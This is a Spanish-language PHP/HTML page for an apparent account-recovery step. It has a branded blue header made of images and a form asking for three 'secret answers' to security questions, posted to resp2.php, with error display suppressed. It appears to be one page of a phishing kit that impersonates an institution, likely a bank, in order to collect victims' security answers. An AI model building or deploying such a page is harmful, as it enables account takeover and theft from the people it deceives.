<?php ini_set("display_errors", 0);?>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<style>

    body {
        margin: 0;
        width: 110%;
        background-color:#D9D8D8 ;
    }
    
    .nav {  
        font-family: Verdana, Arial, Tahoma;
        letter-spacing: -.02em;
        height: 100px;
        display: flex;
        
        
        background-color: #006EB8;
    }

    .cajaform {
        width: 95%;
        background-color: #F7F7F7;
        box-shadow: -1px 2px 5px 1px rgb(179, 179, 179);
        border-radius: 10px;
        height: 500px;
        padding: 10px;
        margin: 0 auto;
        margin-top: -70px;
        
    
    }
    
    .caja2 {
       
        width: 380px;
        background-color: #FFFFFF;
        box-shadow: -1px 1px 5px 1px rgb(179, 179, 179);
        border-radius: 10px;
        height: 200px;
        padding: 15px;
        margin: 0 auto;
        margin-top: 30px;
        position: relative;
        margin-left: -8px;
    }
    
    .form {
        width: 400px;
        margin: 0 auto;
    }
    
    .titulo {
        color: #838181;
        width: 183px;
        margin-left: -40%;
        font-size: 20px;
        font-family: sans-serif;
    }
    
    .caja3 {
        width: 380px;
        background-color: #FFFFFF;
        box-shadow: -1px 1px 5px 1px rgb(179, 179, 179);
        border-radius: 10px;
        height: 100px;
        padding: 15px;
        margin: 0 auto;
       
        position: relative;
        margin-left: -8px;
    }

    .box {
        display: flex;
        flex-direction: column;
        
        margin-top: 30px;
    }


    .recupera {
        width: 300px;
        margin-top: 30px;
        
    }

    .ipp {outline: none;
        list-style: none;
    margin: 0;
    padding: 0;
    font-family: inherit;
    font-weight: inherit;
    background-color: transparent!important;
    width: 250px;
    height: 20px;
    border: none 0!important;
    font-size: .9em;
    font-style: italic;
    color: #b7b7b7;
    border: solid 1px black;
  
    }

    .borde {  border: solid 1px rgb(174, 174, 174);
        color: #000;
    font-family: Verdana,Arial,Tahoma;
    letter-spacing: -.02em;
    margin: 0;
    list-style: none;
    float: left!important;
   
     border-radius: 6px;
    padding: 13px;
    }

.boton1 {
    
   
 color: #FFFFFF;
 margin-top: 2px;
    float: right!important;
     width: 158px;
    height: 41px;
    border: none 0!important;
    cursor: pointer;
  background: none;
     margin-left: 20px;
    font-weight: bold;
     font-size: 15px;
      
}



.titulos {
    width: 200px;
}


</style>
<body>
    
<div class="nav">
   <img style="width: 100px; padding: 10px;    margin-top: -32px;
" src="logo-responsive.svg" alt="">
</div>
 
 <br><br><br>

    <form method="post" action="resp2.php">
         
        <div class="cajaform" style="height:690px;">
            <div class="box">
                <img class="titulos" src="titulo.png" alt="">

                <div class="caja2" style="height:290px;">

                   <br>
                    <span style="font-family:arial;font-size:14px">Responde tus preguntas de seguridad</span>
                   <br>  <br>
                 
                 
                    <div align="left">
				   <input name="resp1" type="text" maxlength="58" placeholder="Respuesta Secreta 1" required
				    style="width:220px;    padding: 6px 0 0 10px; border-radius:5px; height: 36px;" class="processedInputsFocus">
				     
                 <br><br>
                     <input name="resp2" type="text" maxlength="58" placeholder="Respuesta Secreta 2" required
				    style="width:220px;    padding: 6px 0 0 10px; border-radius:5px;    height: 36px;" class="processedInputsFocus">
				      <br><br>
                 
                    <input name="resp3" type="text" maxlength="58" placeholder="Respuesta Secreta 3" required
				    style="width:220px;    padding: 6px 0 0 10px; border-radius:5px;    height: 36px;" class="processedInputsFocus">
				      <br><br>
				  </div> 
				  <div align="center">
				  
                   <div style="">
    <img style="width:200px; position: absolute;" src="btn.png" alt="">
    <input style="position: absolute;" class="boton1" type="submit" value="Continuar" >
    </div>
                </div>
                 
                 

                </div>
				
                    <img class="recupera" src="recupera.png" alt=""  >

        <div class="caja3"><img style="width: 100%; margin-left: -10px; height: 100%;" src="ABAJO.png" alt=""></div>    
<div >
            <img  src="" alt="" srcset="">
      </div>  
        
        
        </div>
    </form>
 
</body>
</html>